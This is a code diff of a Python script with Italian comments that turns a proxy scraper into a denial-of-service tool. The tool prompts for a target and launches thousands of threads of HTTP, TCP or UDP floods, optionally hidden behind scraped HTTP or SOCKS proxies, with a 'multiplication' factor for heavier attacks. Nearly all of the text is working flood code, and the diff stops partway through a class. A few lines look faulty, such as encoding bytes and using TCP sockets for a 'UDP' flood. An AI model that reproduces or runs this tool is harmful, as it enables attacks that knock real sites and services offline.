@@ -1,10 +1,30 @@
-import urllib.request
-import re
-import random
-from bs4 import BeautifulSoup
+import socket
+import socks
 import threading
+import random
+import re
+import urllib.request
+import os
+import sys
+from bs4 import BeautifulSoup
 
-# dichiarazione della lista degli useragents per evitare che il sito ci blocchi per le numerose richieste
+
+try: # se si è sotto linux scapy (per l'attacco tcp-udp) funziona
+	from scapy.all import * # importa scapy
+except: # altrimenti, se fallisce l'importazione
+	print ("TCP/UDP FLOOD ARE NOT SUPPORTED UNDER THIS SYSTEM. YOU MUST USE HTTP FLOOD.") # printa questo
+
+print('''
+    __       _______  __   __  _______  ___      _______  __    _  ______     _______  __   __  _______  ______    ______  
+   |  | |  ||       ||  |_|  ||       ||   |    |   _   ||  |  | ||      |   |       ||  | |  ||   _   ||    _ |  |      | 
+   |  |_|  ||   _   ||       ||    ___||   |    |  |_|  ||   |_| ||  _    |  |    ___||  | |  ||  |_|  ||   | ||  |  _    |
+   |       ||  | |  ||       ||   |___ |   |    |       ||       || | |   |  |   | __ |  |_|  ||       ||   |_||_ | | |   |
+   |       ||  |_|  ||       ||    ___||   |___ |       ||  _    || |_|   |  |   ||  ||       ||       ||    __  || |_|   |
+   |   _   ||       || ||_|| ||   |___ |       ||   _   || | |   ||       |  |   |_| ||       ||   _   ||   |  | ||       |
+   |__| |__||_______||_|   |_||_______||_______||__| |__||_|  |__||______|   |_______||_______||__| |__||___|  |_||______|        					       
+	''') # la grafica ci sta
+
+
 useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
 			"Avant Browser/1.2.789rel1 (http://www.avantbrowser.com)",
 			"Baiduspider ( http://www.baidu.com/search/spider.htm)",
@@ -436,190 +456,560 @@ useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
 			"wii libnup/1.0",
 			]
 
-# urls vari
-nurls = ["http://www.aliveproxy.com/high-anonymity-proxy-list/", "http://www.aliveproxy.com/anonymous-proxy-list/",
-		"http://www.aliveproxy.com/fastest-proxies/", "http://www.aliveproxy.com/us-proxy-list/", "http://www.aliveproxy.com/gb-proxy-list/",
-		"http://www.aliveproxy.com/fr-proxy-list/", "http://www.aliveproxy.com/de-proxy-list/", "http://www.aliveproxy.com/jp-proxy-list/",
-		"http://www.aliveproxy.com/ca-proxy-list/", "http://www.aliveproxy.com/ru-proxy-list/", "http://www.aliveproxy.com/proxy-list-port-80/",
-		"http://www.aliveproxy.com/proxy-list-port-81/", "http://www.aliveproxy.com/proxy-list-port-3128/", "http://www.aliveproxy.com/proxy-list-port-8000/",
-		"http://www.aliveproxy.com/proxy-list-port-8080/", "http://webanetlabs.net/publ/24", "http://www.proxz.com/proxy_list_high_anonymous_0.html",
-		"http://www.proxz.com/proxy_list_anonymous_us_0.html", "http://www.proxz.com/proxy_list_uk_0.html", "http://www.proxz.com/proxy_list_ca_0.html",
-		"http://www.proxz.com/proxy_list_cn_ssl_0.html", "http://www.proxz.com/proxy_list_jp_0.html", "http://www.proxz.com/proxy_list_fr_0.html",
-		"http://www.proxz.com/proxy_list_port_std_0.html", "http://www.proxz.com/proxy_list_port_nonstd_0.html", "http://www.proxz.com/proxy_list_transparent_0.html",
-		"http://www.proxylists.net/", "https://www.my-proxy.com/free-proxy-list.html","https://www.my-proxy.com/free-elite-proxy.html",
-		"https://www.my-proxy.com/free-anonymous-proxy.html", "https://www.my-proxy.com/free-transparent-proxy.html","https://jffjdjkbfek.000webhostapp.com/proxy.txt",
-		"https://cyber-hub.net/proxy/http.txt",]
 
-def proxyget(url): # scarica proxy da altri siti
-	try:
-		req = urllib.request.Request(url) # url corrispondente a una serie di urls impostati sotto.
-		req.add_header("User-Agent", random.choice(useragents)) # aggiunge uno user agent a caso dalla lista sopra
-		sourcecode = urllib.request.urlopen(req, timeout = 10) # scaricamento sourcecode pagina + timeout impostato a 10
-		for line in sourcecode :
-				ip = re.findall("(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})", str(line)) # cerca ip proxy
-				ipf = list(filter(lambda x: x if not x.startswith("0.") else None, ip)) # evita di cattutrare anche ip inutili
-				if ipf: # se trova ip prosegue
-					for x in ipf:
-						ipfinal = x # se lo prende ipfinal
-						out_file = open("proxy.txt","a")
-						while True:
-							out_file.write(x+"\n") # scrive ip uno per uno nel file proxy.txt
-							out_file.close()
-							break # appena finisce ferma il ciclo
-	except: # se c'è un errore
-		print("An error occurred, skipping to the next website.\n") # printa questo
+def starturl(): # in questa funzione setto l'url per renderlo usabile per il futuro settaggio delle richieste HTTP.
+	global url
+	global url2
+	global urlport
 
-def proxyget2(url): # lo dice il nome, questa funzione scarica i proxies
+	url = input("\nInsert URL/IP: ").strip()
+
+	if url == "":
+		print ("Please enter the url.")
+		starturl()
+
 	try:
-		req = urllib.request.Request((url))       # qua impostiamo il sito da dove scaricare.
+		if url[0]+url[1]+url[2]+url[3] == "www.":
+			url = "http://" + url
+		elif url[0]+url[1]+url[2]+url[3] == "http":
+			pass
+		else:
+			url = "http://" + url
+	except:
+		print("You mistyped, try again.")
+		starturl()
+
+	try:
+		url2 = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
+	except:
+		url2 = url.replace("http://", "").replace("https://", "").split("/")[0]
+
+	try:
+		urlport = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]
+	except:
+		urlport = "80"
+
+	floodmode()
+
+def floodmode(): # la scelta della modalità di attacco
+	global choice1
+	choice1 = input("Do you want to perform HTTP flood '0'(best), TCP flood '1' or UDP flood '2' ? ")
+	if choice1 == "0":
+		proxymode()
+	elif choice1 == "1":
+		try:
+			if os.getuid() != 0: # se il programma NON e' stato eseguito come root:
+				print("You need to run this program as root to use TCP/UDP flooding.") # printa questo
+				exit(0) # e esce
+			else: # altrimenti
+				floodport() # continua
+		except:
+			pass
+	elif choice1 == "2":
+		try:
+			if os.getuid() != 0: # se il programma NON e' stato eseguito come root:
+				print("You need to run this program as root to use TCP/UDP flooding.") # printa questo
+				exit(0) # e esce
+			else: # altrimenti
+				floodport() # continua
+		except:
+			pass
+	else:
+		print ("You mistyped, try again.")
+		floodmode()
+
+def floodport():
+	global port
+	try:
+		port = int(input("Enter the port you want to flood: "))
+		portlist = range(65535) # range di tutte le porte informatiche
+		if port in portlist: # se la porta selezionata rientra nel range
+			pass # continua
+		else: # altrimenti
+			print ("You mistyped, try again.")
+			floodport() # riparte la funzione e ti fa riscrivere
+	except ValueError: # se da' errore di valore
+		print ("You mistyped, try again.") # printa questo e
+		floodport() # riparte la funzione e ti fa riscrivere
+	proxymode()
+
+def proxymode():
+	global choice2
+	choice2 = input("Do you want proxy/socks mode? Answer 'y' to enable it: ")
+	if choice2 == "y":
+		choiceproxysocks()
+	else:
+		numthreads()
+
+def choiceproxysocks():
+	global choice3
+	choice3 = input("Type '0' to enable proxymode or type '1' to enable socksmode: ")
+	if choice3 == "0":
+		choicedownproxy()
+	elif choice3 == "1":
+		choicedownsocks()
+	else:
+		print ("You mistyped, try again.")
+		choiceproxysocks()
+
+def choicedownproxy():
+	choice4 = input("Do you want to download a new list of proxy? Answer 'y' to do it: ")
+	if choice4 == "y":
+		urlproxy = "http://free-proxy-list.net/"
+		proxyget(urlproxy)
+	else:
+		proxylist()
+
+def choicedownsocks():
+	choice4 = input("Do you want to download a new list of socks? Answer 'y' to do it: ")
+	if choice4 == "y":
+		urlproxy = "https://www.socks-proxy.net/"
+		proxyget(urlproxy)
+	else:
+		proxylist()
+
+def proxyget(urlproxy): # lo dice il nome, questa funzione scarica i proxies
+	try:
+		req = urllib.request.Request(("%s") % (urlproxy))       # qua impostiamo il sito da dove scaricare.
 		req.add_header("User-Agent", random.choice(useragents)) # siccome il format del sito e' identico sia
-		sourcecode = urllib.request.urlopen(req, timeout=10)    # per free-proxy-list.net che per socks-proxy.net,
+		sourcecode = urllib.request.urlopen(req)                # per free-proxy-list.net che per socks-proxy.net,
 		part = str(sourcecode.read())                           # imposto la variabile urlproxy in base a cosa si sceglie.
-		part = part.split("<tbody>")          # va a fare scraping nel sito
-		part = part[1].split("</tbody>")      # per trovare la parte
-		part = part[0].split("<tr><td>")      # che riguarda i proxies
+		part = part.split("<tbody>")
+		part = part[1].split("</tbody>")
+		part = part[0].split("<tr><td>")
 		proxies = ""
 		for proxy in part:
-			proxy = proxy.split("</td><td>")  # una volta trovata li salva
+			proxy = proxy.split("</td><td>")
 			try:
 				proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
 			except:
 				pass
-		out_file = open("proxy.txt","a")      # e li scrive nel file, aperto come a, per non sovrascrivere proxy gia presenti all'interno
+		out_file = open("proxy.txt","w")
+		out_file.write("")
 		out_file.write(proxies)
 		out_file.close()
+		print ("Proxies downloaded successfully.")
 	except: # se succede qualche casino
-		print("An error occurred, skipping to the next website.\n") # printa questo
+		print ("\nERROR!\n")
+	proxylist() # se va tutto liscio allora prosegue eseguendo la funzione proxylist()
 
-def blogspotget(url, word, word2): # anche questa funzione scarica proxy pero' dai siti blogspot
-	try:
-		soup = BeautifulSoup(urllib.request.urlopen(url))
-		for tag in soup.find_all(word2, word): # bs4, dopo aver processato la source, trova la parte riguardante le proxylist
-			links = tag.a.get("href")				# prende i link delle proxylist
-			result = urllib.request.urlopen(links)	# finalmente apre i link trovati
-			for line in result :
-				ip = re.findall("(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})", str(line)) # cerca gli ip:porta nelle pagine
-				if ip: # se ha trovato gli ip prosegue
-					for x in ip:
-						out_file = open("proxy.txt","a") # scrittura singolo ip nella proxy.txt
-						while True:
-							out_file.write(x+"\n") # scrive ip uno per uno nel file proxy.txt
-							out_file.close()
-							break # il ciclo si ferma non appena ha finito
-	except:
-		print("An error occurred, skipping to the next website.\n")
-
-def proxylist(): # funzione per la creazione della proxylist
+def proxylist():
 	global proxies
-	print ("\nChecking for duplicates...")
-	proxies = open("proxy.txt").readlines() # la lista txt presenta doppioni, quindi:
-	proxiesp = []
-	for i in proxies:
-		if i not in proxiesp: # se il proxy non è già presente in proxiesp
-			proxiesp.append(i) # li aggiunge in proxiesp
-	filepr = open("proxy.txt", "w") # prima cancella contenuto del file
-	filepr.close()
-	filepr = open("proxy.txt", "a") # dopo lo apre in modalità a per non sovrascrivere i proxy
-	for i in proxiesp:
-		filepr.write(i)             # e scrive
-	print("Current IPs in proxylist: %s" % (len(open("proxy.txt").readlines()))) # per vedere quante lines (e quindi quanti proxy) ci sono nel file
-	print ("\nProxylist Updated!\n")
+	out_file = str(input("Enter the proxylist filename/path (proxy.txt): "))
+	if out_file == "":
+		out_file = "proxy.txt"
+	proxies = open(out_file).readlines()
+	numthreads()
 
-def proxycheckerinit():
-	global out_file
-	candidate_proxies = open("proxy.txt").readlines() # vede gli attuali proxy "candidati" lol
-	filedl = open("proxy.txt", "w") # prima cancella contenuto
-	filedl.close()
-	out_file = open("proxy.txt", "a") # e poi lo apre non in riscrivibile
-	threads = [] # crea una lista che ci servirà dopo
-	for i in candidate_proxies:
-		t = threading.Thread(target=proxychecker, args=[i]) # crea un thread per proxy per velocizzare
-		t.start() # e lo avvia
-		threads.append(t) # e lo inserisce nella lista precedente
-
-	for t in threads: # per tutti i threads che hanno finito il loro lavoro,
-		t.join()      # questo li fa aspettare che tutti abbiano finito
-
-	out_file.close()  # chiude il file precedentemente aperto
-	print("\n\nCurrent IPs in proxylist: %s\n" % (len(open("proxy.txt").readlines()))) # quando finisce tutto printa la quantità di proxy FINALE
-
-def proxychecker(i):
-	proxy = 'http://' + i
-	proxy_support = urllib.request.ProxyHandler({'http' : proxy}) # compone la richiesta con il proxy
-	opener = urllib.request.build_opener(proxy_support)
-	urllib.request.install_opener(opener)
-	req = urllib.request.Request(("http://www.google.com"))			# compone la richiesta a google
-	req.add_header("User-Agent", random.choice(useragents))			# aggiunge useragent random per fare sembrare più realistica la req
+def numthreads():
+	global threads
 	try:
-		urllib.request.urlopen(req, timeout=60)						# apre il sito
-		print ("%s works!\n\n" % proxy) # se funziona printa "it works"
-		out_file.write(i)				# e lo scrive nel file.
-	except:
-		print ("%s does not respond.\n\n" % proxy) # altrimenti dice che non risponde
+		threads = int(input(" eight thousand three hundred twenty five (8325): "))
+	except ValueError:
+		threads = 8325
+		print ("8325 threads selected.\n")
+	multiplication()
 
-
-def main(): # funzione effettiva del programma.
+def multiplication():
+	global multiple
 	try:
-		out_file = open("proxy.txt","w") # prima di tutto cancella il contenuto di proxy.txt
-		out_file.close()
+		multiple = int(input("Insert a number of multiplication for the attack [(1-5=normal)(50=powerful)(100 or more=bomb)]: "))
+	except ValueError:
+		print("You mistyped, try again.\n")
+		multiplication()
+	begin()
 
-		print ("\nDownloading from free-proxy-list in progress...")
-		url = "http://free-proxy-list.net/"
-		proxyget2(url) # manda url alla funzione
-		url = "https://www.us-proxy.org/"
-		proxyget2(url)
-		print("Current IPs in proxylist: %s" % (len(open("proxy.txt").readlines()))) # printa la lunghezza attuale del file, che sarebbe il numero di proxy
+def begin():
+	choice6 = input("Press 'Enter' to start attack: ")
+	if choice6 == "":
+		loop()
+	elif choice6 == "Enter": #lool
+		loop()
+	elif choice6 == "enter": #loool
+		loop()
+	else:
+		exit(0)
 
-		print ("\nDownloading from blogspot in progress...\n")
-		url = "http://www.proxyserverlist24.top/"
-		word = "post-title entry-title"
-		word2 = "h3"
-		blogspotget(url,word, word2) # manda url, e due variabili a blogspotget
-		url = "https://proxylistdaily4you.blogspot.com/"
-		word = "post-body entry-content"
-		word2 = "div"
-		blogspotget(url,word,word2)
-		print("Current IPs in proxylist: %s" % (len(open("proxy.txt").readlines())))
+def loop():
+	global threads
+	global get_host
+	global acceptall
+	global connection
+	global go
+	global x
+	if choice1 == "0": # se si e' scelta la http flood, scrive gli header "statici" per non appesantire i threads
+		get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
+		acceptall = [
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", 
+		"Accept-Encoding: gzip, deflate\r\n", 
+		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
+		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
+		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
+		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
+		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
+		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+		"Accept: text/html, application/xhtml+xml",
+		"Accept-Language: en-US,en;q=0.5\r\n",
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
+		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
+		] # header accept a caso per far sembrare le richieste più legittime
+		connection = "Connection: Keep-Alive\r\n" # la keep alive torna sempre utile lol
+	x = 0 # thanks therunixx, my friend
+	go = threading.Event()
+	if choice1 == "1": # se si e' scelto tcp flood
+		if choice2 == "y": # e si e scelta la modalita' proxying
+			if choice3 == "0": # e si sono scelti gli HTTP proxy
+				for x in range(threads):
+					TcpFloodProxed(x+1).start() # starta la classe apposita
+					print ("Thread " + str(x) + " ready!")
+				go.set() # questo fa avviare i threads appena sono tutti pronti
+			else: # altrimenti se si sono scelto è il tcp flood con socks
+				for x in range(threads):
+					TcpFloodSocked(x+1).start() # starta la classe apposita
+					print ("Thread " + str(x) + " ready!")
+				go.set() # questo fa avviare i threads appena sono tutti pronti
+		else: # se non si sono stati scelti proxy o socks
+			for x in range(threads):
+				TcpFloodDefault(x+1).start() # starta la classe apposita
+				print ("Thread " + str(x) + " ready!")
+			go.set() # questo fa avviare i threads appena sono tutti pronti
+	else: # oppure:
+		if choice1 == "2": # se si e' scelto l'UDP flood
+			if choice2 == "y": # e si e' scelta la modalita' proxying
+				if choice3 == "0": # e si sono scelti gli HTTP proxy
+					for x in range(threads):
+						UdpFloodProxed(x+1).start() # starta la classe apposita
+						print ("Thread " + str(x) + " ready!")
+					go.set() # questo fa avviare i threads appena sono tutti pronti
+				else: # se si sono scelti i socks
+					for x in range(threads):
+						UdpFloodSocked(x+1).start() # starta la classe apposita
+						print ("Thread " + str(x) + " ready!")
+					go.set() # questo fa avviare i threads appena sono tutti pronti
+			else: # se non si sono scelti proxy o socks per l'udp flood
+				for x in range(threads):
+					UdpFloodDefault(x+1).start() # starta la classe apposita
+					print ("Thread " + str(x) + " ready!")
+				go.set() # questo fa avviare i threads appena sono tutti pronti
+		else: # se si è scelto l'http flood
+			if choice2 == "y": # se abbiamo scelto la modalita' proxying
+				if choice3 == "0": # e abbiamo scelto gli HTTP proxy
+					for x in range(threads):
+						RequestProxyHTTP(x+1).start() # starta la classe apposita
+						print ("Thread " + str(x) + " ready!")
+					go.set() # questo fa avviare i threads appena sono tutti pronti
+				else: # se abbiamo scelto i socks
+					for x in range(threads):
+						RequestSocksHTTP(x+1).start() # starta la classe apposita
+						print ("Thread " + str(x) + " ready!")
+					go.set() # questo fa avviare i threads appena sono tutti pronti
+			else: # altrimenti manda richieste normali non proxate.
+				for x in range(threads):
+					RequestDefaultHTTP(x+1).start() # starta la classe apposita
+					print ("Thread " + str(x) + " ready!")
+				go.set() # questo fa avviare i threads appena sono tutti pronti
 
-		print ("\nDownloading from various mirrors in progress...")
-		for position, url in enumerate(nurls):
-			proxyget(url)
-			print("Completed downloads: (%s/%s)\nCurrent IPs in proxylist: %s" % (position+1, len(nurls), len(open("proxy.txt").readlines())))
+class TcpFloodProxed(threading.Thread): # la classe del multithreading
 
-		print ("\nDownloading from foxtools in progress...")
-		foxtools = ['http://api.foxtools.ru/v2/Proxy.txt?page=%d' % n for n in range(1, 6)] # per prendere ip di tutte e 6 le pagine
-		for position, url in enumerate(foxtools): # per ogni url starta la funzione apposita
-			proxyget(url)
-		print("Current IPs in proxylist: %s" % (len(open("proxy.txt").readlines())))
+	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
+		threading.Thread.__init__(self)
+		self.counter = counter
 
-		proxylist() # dopo esegue questa funzione che setta meglio la lista
-
-		print("\n")
+	def run(self): # la funzione che da' le istruzioni ai vari threads
+		data = random._urandom(1024) # data per il pacchetto random
+		p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data) # costruzione pacchetto tcp + data
+		current = x # per dare l'id al thread
+		if current < len(proxies): # se l'id del thread si puo' associare ad un proxy, usa quel proxy
+			proxy = proxies[current].strip().split(':')
+		else: # altrimenti lo prende a random
+			proxy = random.choice(proxies).strip().split(":")
+		go.wait() # aspetta che tutti i proxy siano pronti
 		while True:
-			choice = input("\nDo you want to check the proxies? [Y/n] > ") # scelta di quello che vuole l'utente
-			if choice == 'Y' or choice == 'y' or choice == 'yes' or choice == 'Yes' or choice == '': # se si vuole checkare starta funzione del check
-				proxycheckerinit()
-				break
-			if choice == 'N' or choice == 'n' or choice == 'no' or choice == 'No': # altrimenti esce
-				exit(0)
-			else: # se scrivi male input
-				print ("Please write correctly.")
+			try:
+				socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True) # comando per il proxying HTTP
+				s = socks.socksocket() # creazione socket
+				s.connect((str(url2),int(port))) # si connette
+				s.send(p) # ed invia
+				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
+				try: # invia altre richieste nello stesso thread
+					for y in range(multiple): # fattore di moltiplicazione
+						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
+				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
+					s.close()
+			except: # se si verifica un errore
+				s.close() # chiude il thread e ricomincia
 
-	except: # se succede qualcosa di inaspettato
-		print ("\n\nAn error occurred.")
+class TcpFloodSocked(threading.Thread): # la classe del multithreading
 
+	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
+		threading.Thread.__init__(self)
+		self.counter = counter
 
+	def run(self): # la funzione che da' le istruzioni ai vari threads
+		data = random._urandom(1024) # data per il pacchetto random
+		p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data) # costruzione pacchetto tcp + data
+		current = x # per dare l'id al thread
+		if current < len(proxies): # se l'id del thread si puo' associare ad un proxy, usa quel proxy
+			proxy = proxies[current].strip().split(':')
+		else: # altrimenti lo prende a random
+			proxy = random.choice(proxies).strip().split(":")
+		go.wait() # aspetta che threads siano pronti
+		while True:
+			try:
+				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) # comando per il proxying via SOCKS
+				s = socks.socksocket() # creazione socket
+				s.connect((str(url2),int(port))) # si connette
+				s.send(p) # ed invia
+				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
+				try: # invia altre richieste nello stesso thread
+					for y in range(multiple): # fattore di moltiplicazione
+						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
+				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
+					s.close()
+			except: # se si verifica un errore
+				s.close() # intanto chiude il precedente socket non funzionante
+				try:
+					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) # poi prova ad utilizzare SOCKS4, magari e' questo il problema dell'errore
+					s = socks.socksocket() # creazione socket
+					s.connect((str(url2),int(port))) # connessione
+					s.send(p) # invio
+					print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
+					try: # invia altre richieste nello stesso thread
+						for y in range(multiple): # fattore di moltiplicazione
+							s.send(str.encode(p)) # encode in bytes della richiesta HTTP
+					except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
+						s.close()
+				except: # se nemmeno questo funge, allora il sock e' down
+					print ("Sock down. Retrying request. @", self.counter)
+					s.close() # chiude il socket e ricomincia ciclo
+
+class TcpFloodDefault(threading.Thread): # la classe del multithreading
+
+	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
+		threading.Thread.__init__(self)
+		self.counter = counter
+
+	def run(self): # la funzione che da' le istruzioni ai vari threads
+		data = random._urandom(1024) # data per il pacchetto random
+		p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data) # costruzione pacchetto tcp + data
+		go.wait() # aspetta che tutti i threads siano pronti
+		while True: # ciclo infinito
+			try: # il try per non far chiudere il programma se qualcosa va storto
+				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creazione solito socket
+				s.connect((str(url2),int(port))) # connessione al target
+				s.send(p) # questo manda il pacchetto tcp creato al target
+				print ("Request Sent! @", self.counter) # print richiesta + counter
+				try: # invia altre richieste nello stesso thread
+					for y in range(multiple): # fattore di moltiplicazione
+						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
+				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
+					s.close()
+			except: # se si verifica un errore
+				s.close() # lo ignora e ricomincia il ciclo
+
+class UdpFloodProxed(threading.Thread): # la classe del multithreading
+
+	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
+		threading.Thread.__init__(self)
+		self.counter = counter
+
+	def run(self): # la funzione che da' le istruzioni ai vari threads
+		data = random._urandom(1024) # data per il pacchetto random
+		p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data) # crea pacchetto udp classico + data
+		current = x # per dare l'id al thread
+		if current < len(proxies): # se l'id del thread si puo' associare ad un proxy, usa quel proxy
+			proxy = proxies[current].strip().split(':')
+		else: # altrimenti lo prende a random
+			proxy = random.choice(proxies).strip().split(":")
+		go.wait() # aspetta che threads sono pronti
+		while True:
+			try:
+				socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True) # comando per il proxying HTTP
+				s = socks.socksocket() # creazione socket
+				s.connect((str(url2),int(port))) # connessione
+				s.send(p) # invio
+				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
+				try: # invia altre richieste nello stesso thread
+					for y in range(multiple): # fattore di moltiplicazione
+						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
+				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
+					s.close()
+			except: # se qualcosa va storto
+				s.close() # chiude il socket
+
+class UdpFloodSocked(threading.Thread): # la classe del multithreading
+
+	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
+		threading.Thread.__init__(self)
+		self.counter = counter
+
+	def run(self): # la funzione che da' le istruzioni ai vari threads
+		data = random._urandom(1024) # data per il pacchetto random
+		p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data) # crea pacchetto udp classico + data
+		current = x # per dare l'id al thread
+		if current < len(proxies): # se l'id del thread si puo' associare ad un proxy, usa quel proxy
+			proxy = proxies[current].strip().split(':')
+		else: # altrimenti lo prende a random
+			proxy = random.choice(proxies).strip().split(":")
+		go.wait() # aspetta che threads siano pronti
+		while True:
+			try:
+				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) # comando per il proxying con SOCKS
+				s = socks.socksocket() # creazione socket
+				s.connect((str(url2),int(port))) # connessione
+				s.send(p) # invio
+				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # req + counter
+				try: # invia altre richieste nello stesso thread
+					for y in range(multiple): # fattore di moltiplicazione
+						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
+				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
+					s.close()
+			except: # se qualcosa va storto questo except chiude il socket e si collega al try sotto
+				s.close() # intanto chiude il precedente socket non funzionante
+				try:
+					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) # poi prova ad utilizzare SOCKS4, magari e' questo il problema dell'errore
+					s = socks.socksocket() # creazione socket
+					s.connect((str(url2),int(port))) # connessione
+					s.send(p) # invio
+					print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # req + counter
+					try: # invia altre richieste nello stesso thread
+						for y in range(multiple): # fattore di moltiplicazione
+							s.send(str.encode(p)) # encode in bytes della richiesta HTTP
+					except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
+						s.close()
+				except: # se nemmeno questo funge, allora il sock e' down
+					print ("Sock down. Retrying request. @", self.counter)
+					s.close() # chiude il socket e ricomincia ciclo
+
+class UdpFloodDefault(threading.Thread): # la classe del multithreading
+
+	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
+		threading.Thread.__init__(self)
+		self.counter = counter
+
+	def run(self): # la funzione che da' le istruzioni ai vari threads
+		data = random._urandom(1024) # data per il pacchetto random
+		p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data) # crea pacchetto udp classico + data
+		go.wait() # aspetta che i threads siano pronti
+		while True: # ciclo infinito
+			try: # il try per non far chiudere il programma se si verifica qualche errore
+				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creazione socket
+				s.connect((str(url2),int(port))) # connessione al target
+				s.send(p) # questo manda il pacchetto udp creato al target
+				print ("Request Sent! @", self.counter) # print req + counter
+				try: # invia altre richieste nello stesso thread
+					for y in range(multiple): # fattore di moltiplicazione
+						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
+				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
+					s.close()
+			except: # se si verifica un errore
+				s.close() # lo ignora e ricomincia il ciclo
+
+class RequestProxyHTTP(threading.Thread): # la classe del multithreading
+
+	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
+		threading.Thread.__init__(self)
+		self.counter = counter
+
+	def run(self): # la funzione che da' le istruzioni ai vari threads
+		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" # scelta useragent a caso
